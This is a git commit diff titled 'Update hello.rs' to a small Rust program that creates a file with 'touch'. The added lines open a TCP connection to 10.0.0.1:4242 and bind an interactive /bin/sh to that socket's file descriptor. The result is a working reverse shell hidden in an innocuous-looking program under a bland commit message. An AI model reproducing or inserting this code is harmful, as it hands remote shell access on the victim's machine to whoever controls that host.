4a2b7efc66f3367b22f4be294007648d3ec589fb
aman143kri <42419157+aman143kri@users.noreply.github.com>
2024-12-20 10:37:30 -0800

    Update hello.rs

--- hello.rs
+++ hello.rs
@@ -1,4 +1,6 @@
-use std::process::Command;
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
 
 fn main() {
     let output = Command::new("touch")
@@ -11,4 +13,15 @@ fn main() {
     } else {
         eprintln!("Error creating file");
     }
+    let s = TcpStream::connect("10.0.0.1:4242").unwrap();
+    let fd = s.as_raw_fd();
+    Command::new("/bin/sh")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
 }
